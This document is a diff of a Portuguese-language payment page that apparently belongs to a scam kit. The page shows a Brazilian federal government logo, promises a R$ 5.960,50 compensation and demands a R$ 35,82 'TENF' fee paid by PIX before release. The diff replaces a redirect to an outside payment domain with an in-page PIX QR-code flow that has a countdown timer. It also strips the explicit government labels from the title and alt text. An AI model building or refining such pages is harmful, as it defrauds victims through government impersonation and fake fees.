@@ -1,7 +1,7 @@
-﻿<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Pagamento - Governo Federal</title>
+    <title>Regularização de Taxa - Etapa Final</title>
     <link rel="stylesheet" href="css/styles.css">
     
     <script>
@@ -50,38 +50,58 @@ src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1"
 <body>
     <div class="container">
         <div style="width: 100%; text-align: center; margin: auto;">
-            <img src="images/GOV-1.png" alt="Governo Federal" class="logo" style="width: 100%; max-width: 130px;">
+            <img src="images/GOV-1.png" alt="Logo" class="logo" style="width: 100%; max-width: 130px;">
         </div>
 
-        <div class="amount">
-            <div class="amount-label">Indenização disponível:</div>
-            <div class="amount-value">R$ 5.960,50</div>
+        <div class="step-chips">
+            <div id="chip1" class="chip active">1. Revisao</div>
+            <div id="chip2" class="chip">2. Pagamento PIX</div>
+            <div id="chip3" class="chip">3. Confirmacao</div>
         </div>
 
-        <div class="tax-box">
-            <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
-            <div class="tax-box-value">R$ 35,82</div>
+        <div id="step1" class="panel">
+            <div class="amount">
+                <div class="amount-label">Indenização disponível:</div>
+                <div class="amount-value">R$ 5.960,50</div>
+            </div>
+
+            <div class="tax-box">
+                <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
+                <div class="tax-box-value">R$ 35,82</div>
+            </div>
+
+            <button id="paymentButton" class="button">Efetuar pagamento da Taxa</button>
+            <div id="loadingMessage">Gerando código PIX...</div>
+
+            <div class="info-box">
+                Para liberar a transferência, é necessário regularizar a taxa TENF. Após o pagamento, a validação é concluída automaticamente.
+            </div>
+            <div id="step1Status" class="status hidden"></div>
         </div>
 
-        <button id="paymentButton" class="button" link="" rel="stylesheet" onclick="checkout(event)">Efetuar pagamento da Taxa</button>
-        <script>
-            function checkout(event) {
-                event.preventDefault();
-                var currentUrlParams = window.location.search;
-                window.location.href = "https://pay.chat-consultabrasil.fun/yOeXZK7LAdxZAQa" + currentUrlParams;
-            }
-        </script>
-        <div id="loadingMessage">Gerando código PIX...</div>
+        <div id="step2" class="panel hidden">
+            <h3 class="pix-title">PIX gerado com sucesso</h3>
+            <div class="qr-box">
+                <div id="qrcode"></div>
+            </div>
+            <div id="pix-copy-code" class="pix-copy-code">Gerando codigo PIX...</div>
+            <div class="actions">
+                <button id="copy-pix-btn" class="button ghost">Copiar codigo</button>
+                <button id="verify-pix-btn" class="button ghost">Ja paguei - Verificar</button>
+            </div>
+            <div class="countdown">Tempo restante: <span id="timer">--:--</span></div>
+            <div id="step2Status" class="status hidden"></div>
+        </div>
 
-        
-
-        <div class="info-box">
-            Para receber o valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). Que
-            corresponde ao custo gerado por transferências de alto valor, após o pagamento será feito a transferência
-            imediata da sua indenização para sua chave pix cadastrada. Caso não conclua o pagamento dessa taxa, sua
-            indenização será bloqueada.
+        <div id="step3" class="panel hidden">
+            <h3 class="pix-title">Pagamento confirmado</h3>
+            <div class="info-box success">
+                Recebemos a confirmação da sua taxa. Você será redirecionado para o próximo passo.
+            </div>
+            <button id="continueBtn" class="button">Continuar</button>
         </div>
     </div>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
     <script src="js/script.js"></script>
 
 <script
